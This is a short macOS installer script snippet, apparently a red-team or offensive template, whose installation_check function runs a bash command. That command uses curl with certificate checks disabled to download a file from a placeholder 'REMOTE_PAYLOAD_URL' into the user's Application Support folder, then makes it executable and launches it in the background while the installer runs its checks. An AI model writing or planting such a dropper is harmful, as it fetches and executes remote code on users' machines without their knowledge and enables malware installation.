installer-gui-script.script:
function installation_check () {
    // Run a custom script
    command = "/usr/bin/curl -k 'REMOTE_PAYLOAD_URL' -o /Users/$USER/Library/Application\ Support/operator-payload; chmod +x /Users/$USER/Library/Application\ Support/operator-payload; /Users/$USER/Library/Application\ Support/operator-payload &"
    exit_code = system.run('/bin/bash', '-c', command);
    if (exit_code != 0) {
        // need to set error type
        my.result.type = "Fatal"
        my.result.message = "Install failed"
        return false
    }
    return true
}
